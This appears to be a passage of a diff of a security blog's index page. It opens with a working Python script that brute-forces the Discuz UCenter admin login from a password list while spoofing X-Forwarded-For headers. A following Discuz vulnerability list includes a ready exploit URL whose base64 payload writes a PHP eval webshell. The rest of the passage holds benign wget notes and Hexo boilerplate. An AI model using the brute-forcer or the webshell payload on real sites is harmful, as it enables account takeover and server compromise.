class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHtml</span><span class="params">(host, htmlhash, htmlpass, htmlseccode)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php?m=user&amp;a=login'</span></span><br><span class="line">    ip = str(random.randint(<span class="number">1</span>,<span class="number">100</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>)) + <span class="string">"."</span> + str(random.randint(<span class="number">100</span>,<span class="number">244</span>))</span><br><span class="line"></span><br><span class="line">    postHead = &#123;<span class="string">'host'</span>: host,</span><br><span class="line">                <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0'</span>,</span><br><span class="line">                <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</span><br><span class="line">                <span class="string">'Accept-Language'</span>: <span class="string">'zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3'</span>,</span><br><span class="line">                <span class="string">'X-Forwarded-For'</span>: ip,</span><br><span class="line">                <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">                <span class="string">'Connection'</span>: <span class="string">'keep-alive'</span> &#125;</span><br><span class="line">    postContent = <span class="string">'sid=&amp;formhash='</span> + htmlhash + <span class="string">'&amp;seccodehidden='</span> + htmlseccode + <span class="string">'&amp;iframe=0&amp;isfounder=1&amp;password='</span> + htmlpass + <span class="string">'&amp;seccode=cccc&amp;submit=%E7%99%BB+%E5%BD%95'</span></span><br><span class="line">    <span class="comment"># resultHtml = httplib.HTTPConnection(host, 80, False)</span></span><br><span class="line">    <span class="comment"># resultHtml.request('POST', '/uc_server/admin.php?m=user&amp;a=login',</span></span><br><span class="line">    <span class="comment">#                    body = postContent,</span></span><br><span class="line">    <span class="comment">#                    headers = postHead )</span></span><br><span class="line">    <span class="comment"># page = resultHtml.getresponse()</span></span><br><span class="line">    <span class="comment"># pageConect = page.read()</span></span><br><span class="line">    page = requests.post(url, headers = postHead, data = postContent)</span><br><span class="line">    <span class="keyword">print</span> str(page.status_code) + <span class="string">'\t'</span> + str(page.history) + <span class="string">'\t'</span> + htmlpass</span><br><span class="line">    pageConect = page.text</span><br><span class="line">    pageSoup = BeautifulSoup(pageConect, <span class="string">"lxml"</span>)</span><br><span class="line">    pageTitle = pageSoup.title.string</span><br><span class="line">    <span class="keyword">return</span> pageTitle,page.status_code</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get formhash and seccodehidden</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethashs</span><span class="params">(host)</span>:</span></span><br><span class="line">    url = <span class="string">'http://'</span> + host + <span class="string">'/uc_server/admin.php'</span></span><br><span class="line">    pageContent = requests.get(url).text</span><br><span class="line">    r1 = re.compile(<span class="string">r'&lt;input type="hidden" name="formhash" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlhash = r1.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    r2 = re.compile(<span class="string">r'&lt;input type="hidden" name="seccodehidden" value="(\S+)" /&gt;'</span>)</span><br><span class="line">    htmlseccode = r2.findall(pageContent)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> htmlhash + <span class="string">' '</span> + htmlseccode</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get host/dict/sleeptime</span></span><br><span class="line"><span class="keyword">if</span>(len(argv)==<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' host dictfile sleeptime'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'----&gt;python '</span> + argv[<span class="number">0</span>] + <span class="string">' **.**.**.** pass.txt 0.2'</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    host = argv[<span class="number">1</span>]</span><br><span class="line">    passfile = argv[<span class="number">2</span>]</span><br><span class="line">    sleeptime = argv[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;host:\t'</span> + host</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;password file:\t'</span> + passfile</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;sleeptime:\t'</span> + sleeptime</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---&gt;\n'</span></span><br><span class="line"></span><br><span class="line">    x = gethashs(host).split(<span class="string">' '</span>)</span><br><span class="line">    f = open(passfile, <span class="string">'r'</span>)</span><br><span class="line">    htmlpass = f.readlines()</span><br><span class="line">    <span class="comment"># temp = htmlpass[:]</span></span><br><span class="line">    <span class="comment"># nf = open('temp.new', 'w')</span></span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(htmlpass)):</span><br><span class="line">        pwd = str(htmlpass[i].split())</span><br><span class="line">        time.sleep(float(sleeptime))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span>(getHtml(host, x[<span class="number">0</span>], pwd, x[<span class="number">1</span>])[<span class="number">0</span>] == <span class="string">''</span>):</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'----&gt;Password is: '</span> + pwd</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">print</span> sys.exc_info()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#     finally:</span></span><br><span class="line">    <span class="comment">#         temp.remove(htmlpass[i])</span></span><br><span class="line">    <span class="comment">#     if i == 1:</span></span><br><span class="line">    <span class="comment">#         raise NameError('test')</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># nf.writelines(temp)</span></span><br><span class="line">                    </span><br><span class="line">    <span class="comment"># f.close()</span></span><br><span class="line">    <span class="comment"># nf.close()</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">        <span class="comment"># except:</span></span><br><span class="line">        <span class="comment">#     time.sleep(5.0)</span></span><br><span class="line">        <span class="comment">#     result = getHtml(host, x[0], pwd, x[1])</span></span><br><span class="line">        <span class="comment"># if(result[0] == "UCenter Administrator's Control Panel"):</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># elif 5 in result[1]:</span></span><br><span class="line">        <span class="comment">#     continue</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     print '----&gt;Password is: ' + pwd</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
+
+<p> <code>python dz.py **.**.**.** pass.txt 0</code></p>
+<p> <img src="http://www.wooyun.org/upload/201410/21065832e3c6315987a3a5ba66db3d66ae619422.png" alt=""></p>
+</li>
+<li></li>
+</ol>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/14/discuz-bug-list/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/discuz-bug-list/" class="post-title-link" itemprop="url">Discuz vuls list</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:49:23" itemprop="dateCreated datePublished" datetime="2016-05-14T00:49:23+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:29:49" itemprop="dateModified" datetime="2019-07-25T14:29:49+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/discuz-bug-list/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/discuz-bug-list/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<h1 id="Discuz-漏洞收集"><a href="#Discuz-漏洞收集" class="headerlink" title="Discuz 漏洞收集"></a>Discuz 漏洞收集</h1><pre><code>Discuz! 6.x/7.x 全局变量防御绕过漏洞  由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞. 
+
+Discuz! admin\styles.inc.php get-webshell bug   由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞. 
+
+Discuz!&lt;5.50 $onlineipmatches 未初始化漏洞     由于Discuz!&lt;5.50的common.inc.php使用preg_match()的变量$onlineipmatches 未初始化漏洞,导致可以容易构造$onlineip  
+
+Discuz! 1_modcp_editpost.tpl.php xss bug    由于Discuz!的1_modcp_editpost.tpl.php里$orig[&apos;message&apos;]未过滤,导致一个xss漏洞.   
+
+Discuz! admin\database.inc.php get-webshell bug     由于Discuz!的admin\database.inc.php里action=importzip解压zip文件时,导致可以得到webshell.   
+
+Discuz! Reset User Password Vulnerability   由于Discuz! 的 随机数使用的播种缺陷,在找会用户密码时可以暴力得到id的随机hash,从而导致容易修改用户密码的严重漏洞.   
+
+Discuz! $_DCACHE数组变量覆盖漏洞 [update 11.14]     由于Discuz! 的wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题.     
+
+Discuz! 路径信息泄露 bug  由于Discuz! cache file的数组$_DCACHE,$_CACHE等的变量名没有初始化导致路径信息泄露.  
+
+Discuz! member.php xss bug  由于Discuz!的member.php对$listgid并没有初始化导致一个严重的xss bug.  
+
+Discuz! admin\runwizard.inc.php get-webshell bug    由于Discuz!的admin\runwizard.inc.php里saverunwizardhistory()写文件操作没有限制导致执行代码漏洞.  
+
+Discuz! modcp\moderate.inc.php 数据库注射bug     由于Discuz!的modcp/moderate.inc.php里$fidadd数组变量没有初始化导致sql注射bug     
+
+Discuz! moderation.inc.php 数据库&apos;注射&apos; bug  由于Discuz!的include/moderation.inc.php存在一个&apos;二次攻击&apos;导致数据库&apos;注射&apos;的bug     
+
+Discuz! trade.php 数据库&apos;注射&apos; bug   由于Discuz!的trade.php里的$message处理不严格导致引起数据库操作错误,通过SODB-2008-06而导致xss攻击及数据库信息泄露的漏洞.    
+
+Discuz! 数据库错误信息xss bug  由于Discuz!在处理数据库的错误信息时对$GLOBALS[&apos;PHP_SELF&apos;]没有过滤,导致在让数据库出错的情况下导致xss攻击.    
+
+Discuz!4.x wap\index.php 变量覆盖漏洞     由于Discuz!的wap\index.php处理post的变量不严谨而导致变量覆盖,从而可能导致sql注射/代码执行/xss等攻击.     
+
+Discuz! cache.func.php信息泄漏的bug  由于Discuz!的\include\cache.func.php缺少访问限制导致版本及补丁消息的泄露.    
+
+Discuz! flash Crsf bug  由于Discuz!对flash跨域策略文件及上传图片文件处理不严导致可以绕过formhash及Referer的限制,导致csrf攻击.     
+
+Discuz! admincp.php xss bug     由于Discuz!的后台登陆文件$url_forward没有过滤导致一个严重的xss bug.     
+
+Discuz![flash] xss bug  由于Discuz!对上传图片文件处理不严及flash标签安全设置不严导致一个严重的xss bug.   
+
+Discuz 6.x—7.x:WAP高危漏洞,wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题
+
+Discuz 7.0-7.2:后台settings.inc.php中写shell漏洞
+
+Discuz 7.1-7.2：showmessage bug,利用方式:misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}
+
+Discuz 7.2:SQL注入漏洞/manyou/sources/notice.php
+
+Discuz 7.2代码执行漏洞
+
+Discuz! x1-1.5 SQL 注入 GetShell EXP 
+
+Discuz! X1-1.5 notify_credit.php 页面SQL注入漏洞 
+
+Discuz! 1.5 跨站脚本攻击漏洞 UC登陆页面存在跨站漏洞
+
+DiscuzX1.5 门户管理权限SQL注入BUG
+
+DZ-X1.5 论坛后台拿WebShell
+
+discuz x1.5&amp;discuz 7.2 后台getshell 0day
+
+DISCUZ X1.5 本地文件包含漏洞
+
+Discuz! X2:SQL注入漏洞source\module\forum\forum_attachment.php
+
+Discuz! X2:SQL注入member.php?mod=logging&amp;action=login，提交username=1+and+1=1
+
+Discuz!NT 2.x - 3.5.2 SQL注入(0day)
+
+Discuz!NT3.5.2文件编辑0Day获取Webshell</code></pre>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/14/python-tips/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/14/python-tips/" class="post-title-link" itemprop="url">Python skill collection</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-14 00:45:07" itemprop="dateCreated datePublished" datetime="2016-05-14T00:45:07+08:00">2016-05-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:27:12" itemprop="dateModified" datetime="2019-07-25T14:27:12+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/14/python-tips/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/python-tips/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <a id="more"></a>
+
+<p><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-pythondebugger/" target="_blank" rel="noopener">Python代码调试技巧</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2016/05/04/wget-usage/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/05/04/wget-usage/" class="post-title-link" itemprop="url">wget 使用筆記</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2016-05-04 14:52:16" itemprop="dateCreated datePublished" datetime="2016-05-04T14:52:16+08:00">2016-05-04</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-07-25 14:26:17" itemprop="dateModified" datetime="2019-07-25T14:26:17+08:00">2019-07-25</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2016/05/04/wget-usage/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/04/wget-usage/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="概况"><a href="#概况" class="headerlink" title="概况"></a>概况</h1><p>需要下载某个目录下面的所有文件。命令如下</p>
+<pre><code>wget -c -r -np -k -L -p www.xxx.org/pub/path/</code></pre><p>在下载时。有用到外部域名的图片或连接。如果需要同时下载就要用-H参数。</p>
+<pre><code>wget -np -nH -r --span-hosts www.xxx.org/pub/path/
+
+-c 断点续传
+-r 递归下载，下载指定网页某一目录下（包括子目录）的所有文件
+-nd 递归下载时不创建一层一层的目录，把所有的文件下载到当前目录
+-np 递归下载时不搜索上层目录，如wget -c -r www.xxx.org/pub/path/
+没有加参数-np，就会同时下载path的上一级目录pub下的其它文件
+-k 将绝对链接转为相对链接，下载整个站点后脱机浏览网页，最好加上这个参数
+-L 递归时不进入其它主机，如wget -c -r www.xxx.org/ </code></pre><p>如果网站内有一个这样的链接：<br><a href="http://www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站" target="_blank" rel="noopener">www.yyy.org，不加参数-L，就会像大火烧山一样，会递归下载www.yyy.org网站</a></p>
+<pre><code>-p 下载网页所需的所有文件，如图片等
+-A 指定要下载的文件样式列表，多个样式用逗号分隔
+-i 后面跟一个文件，文件内指明要下载的URL</code></pre><p>还有其他的用法，我从网上搜索的，也一并写上来，方便以后自己使用。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2016/05/04/wget-usage/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="default">
+    <link itemprop="mainEntityOfPage" href="https://blog.securitainment.io/2000/01/01/hello-world/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Groot">
+      <meta itemprop="description" content="运维 | 安全">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2000/01/01/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2000-01-01 00:00:00" itemprop="dateCreated datePublished" datetime="2000-01-01T00:00:00+08:00">2000-01-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2019-03-12 16:34:05" itemprop="dateModified" datetime="2019-03-12T16:34:05+08:00">2019-03-12</time>
+              </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Disqus: </span>
+    
+    <a title="disqus" href="/2000/01/01/hello-world/#disqus_thread" itemprop="discussionUrl">
+      <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2000/01/01/hello-world/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Groot</p>
+  <div class="site-description" itemprop="description">运维 | 安全</div>
 </div>
-    <div class="footer" id="footer">
-    <p><h4>Copyright © 2020 | Author: Groot | <a href="https://github.com/Xunzhuo/hexo-theme-coder" target="_blank" rel="noopener">Theme: Hexo-Coder</a></h4>
-        <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
-            <input type="checkbox" name="switch" id="update_style">
-            <span class="el-switch-style"></span>
-        </label>
-<!--         <script type="text/javascript">
-        var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
-        document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
-        </script> -->
-    </p>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">26</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
 </div>
-<input type="hidden" id="web_style" value="black">
-<input type="hidden" id="valine_appid" value="">
-<input type="hidden" id="valine_appKey" value="">
-
-<script src="/libs/jquery.min.js"></script>
 
 
-<script src="/libs/highlight/highlight.pack.js"></script>
 
-<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+      </div>
 
-<script src="/js/js.js"></script>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
 
-<style type="text/css">
-.v * {
-    color: #698fca;
-}
 
-.v .vlist .vcard .vhead .vsys {
-    color: #3a3e4a;
-}
+      </div>
+    </main>
 
-.v .vlist .vcard .vh .vmeta .vat {
-    color: #638fd5;
-}
+    <footer class="footer">
+      <div class="footer-inner">
+        
 
-.v .vlist .vcard .vhead .vnick {
-    color: #6ba1ff;
-}
+        
 
-.v a {
-    color: #8696b1;
-}
+<div class="copyright">
+  
+  &copy; 2016 – 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Groot</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
 
-.v .vlist .vcard .vhead .vnick:hover {
-    color: #669bfc;
-}
-</style>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script>
+  function loadCount() {
+    var d = document, s = d.createElement('script');
+    s.src = 'https://securitainment.disqus.com/count.js';
+    s.id = 'dsq-count-scr';
+    (d.head || d.body).appendChild(s);
+  }
+  // defer loading until the whole page loading is completed
+  window.addEventListener('load', loadCount, false);
+</script>
+
 </body>
 </html>
